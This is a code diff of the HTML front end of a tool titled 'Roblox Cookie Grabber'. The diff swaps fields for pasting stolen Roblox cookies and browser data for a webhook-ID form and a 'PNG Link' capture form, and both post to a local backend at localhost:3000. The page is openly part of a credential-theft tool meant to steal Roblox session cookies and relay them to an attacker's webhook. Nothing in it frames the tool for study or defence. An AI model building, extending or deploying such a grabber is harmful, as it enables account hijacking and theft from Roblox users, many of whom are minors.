@@ -7,26 +7,47 @@
 </head>
 <body>
     <h1>Roblox Cookie Grabber</h1>
-    <form id="captureForm">
-        <label for="cookies">Roblox Cookies:</label>
-        <input type="text" id="cookies" name="cookies" required><br><br>
-        <label for="browserData">Browser Data:</label>
-        <input type="text" id="browserData" name="browserData" required><br><br>
+    <form id="webhookForm">
+        <label for="webhookId">Webhook ID:</label>
+        <input type="text" id="webhookId" name="webhookId" required><br><br>
+        <button type="submit">Set Webhook ID</button>
+    </form>
+    <form id="captureForm" style="display: none;">
+        <label for="pngLink">PNG Link:</label>
+        <input type="text" id="pngLink" name="pngLink" required><br><br>
         <button type="submit">Capture and Send</button>
     </form>
 
     <script>
+        document.getElementById('webhookForm').addEventListener('submit', async (event) => {
+            event.preventDefault();
+            const webhookId = document.getElementById('webhookId').value;
+            const response = await fetch('http://localhost:3000/set-webhook', {
+                method: 'POST',
+                headers: {
+                    'Content-Type': 'application/json'
+                },
+                body: JSON.stringify({ webhookId })
+            });
+
+            if (response.ok) {
+                alert('Webhook ID set!');
+                document.getElementById('webhookForm').style.display = 'none';
+                document.getElementById('captureForm').style.display = 'block';
+            } else {
+                alert('Failed to set webhook ID.');
+            }
+        });
+
         document.getElementById('captureForm').addEventListener('submit', async (event) => {
             event.preventDefault();
-            const cookies = document.getElementById('cookies').value;
-            const browserData = document.getElementById('browserData').value;
-
+            const pngLink = document.getElementById('pngLink').value;
             const response = await fetch('http://localhost:3000/capture', {
                 method: 'POST',
                 headers: {
                     'Content-Type': 'application/json'
                 },
-                body: JSON.stringify({ cookies, browserData })
+                body: JSON.stringify({ pngLink })
             });
 
             if (response.ok) {
